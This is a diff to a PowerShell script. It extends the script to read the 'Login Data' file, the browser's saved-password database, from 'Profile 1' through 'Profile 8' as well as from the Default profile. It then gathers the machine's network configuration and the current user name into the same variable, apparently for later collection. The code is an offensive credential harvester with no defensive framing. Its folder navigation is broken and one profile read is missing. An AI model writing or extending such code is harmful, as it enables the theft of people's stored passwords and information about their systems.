@@ -4,6 +4,82 @@ cd Default
 
 $var += cat "Login Data"
 
+#try
+
+$Folder = 'Profile 1'
+if (Test-Path -Path $Folder) { 
+   cd $Folder
+} else {
+    "Path doesn't exist."
+}
+
+$var += cat "Login Data"
+
+$Folder = 'Profile 2'
+if (Test-Path -Path $Folder) { 
+   cd $Folder
+} else {
+    "Path doesn't exist."
+}
+
+$Folder = 'Profile 3'
+if (Test-Path -Path $Folder) { 
+   cd $Folder
+} else {
+    "Path doesn't exist."
+}
+
+$var += cat "Login Data"
+
+$Folder = 'Profile 4'
+if (Test-Path -Path $Folder) { 
+   cd $Folder
+} else {
+    "Path doesn't exist."
+}
+
+$var += cat "Login Data"
+
+$Folder = 'Profile 5'
+if (Test-Path -Path $Folder) { 
+   cd $Folder
+} else {
+    "Path doesn't exist."
+}
+
+$var += cat "Login Data"
+
+$Folder = 'Profile 6'
+if (Test-Path -Path $Folder) { 
+   cd $Folder
+} else {
+    "Path doesn't exist."
+}
+
+$var += cat "Login Data"
+
+$Folder = 'Profile 7'
+if (Test-Path -Path $Folder) { 
+   cd $Folder
+} else {
+    "Path doesn't exist."
+}
+
+$var += cat "Login Data"
+
+$Folder = 'Profile 8'
+if (Test-Path -Path $Folder) { 
+   cd $Folder
+} else {
+    "Path doesn't exist."
+}
+
+$var += cat "Login Data"
+
+start-sleep 4
+
+
+
 $var += Get-NetIPConfiguration 
 
 $var += whoami
